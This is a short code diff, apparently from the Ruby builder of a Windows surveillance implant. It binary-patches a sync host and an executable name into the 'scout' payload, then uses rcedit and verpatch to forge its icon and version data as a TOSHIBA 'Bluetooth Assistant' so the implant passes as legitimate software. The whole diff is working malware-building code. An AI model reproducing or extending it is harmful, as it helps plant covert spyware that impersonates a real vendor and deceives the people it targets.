@@ -45,6 +45,8 @@ class BuildWindows < Build
           host = @factory.configs.first.sync_host
           raise "Sync host not found" unless host
           content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
+          # the filename of the final exec
+          content.binary_patch 'SCOUT'*4, scout_name(@factory.confkey)[:name].ljust(20, "\x00")
         rescue
           raise "Sync marker not found"
         end
@@ -158,6 +160,9 @@ class BuildWindows < Build
     melting_mode = :silent
     melting_mode = :cooked if @cooked
     melting_mode = :melted if params['input']
+
+    # change the icon of the exec accordingly to the name
+    customize_scout(@factory.confkey) if @scout
 
     case melting_mode
       when :silent
@@ -356,6 +361,21 @@ class BuildWindows < Build
     fake_names[seed.ord % fake_names.size] + " " + fakever
   end
 
+  def scout_name(seed)
+    scout_names = [{name: 'btassist', version: '7.0.0.0', desc: 'Bluetooth Assistant', company: 'TOSHIBA CORPORATION', copyright: 'Copyright (C) 2009 TOSHIBA CORPORATION, All rights reserved.'}]
+
+    scout_names[seed.ord % scout_names.size]
+  end
+
+  def customize_scout(seed)
+
+    info = scout_name(seed)
+    icon = "icons/#{info[:name]}.ico"
+
+    CrossPlatform.exec path('rcedit'), "/I #{path('scout')} #{path(icon)}"
+
+    CrossPlatform.exec path('verpatch'), "/va #{path('scout')} \"#{info[:version]}\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
+  end
 end
 
 end #DB::
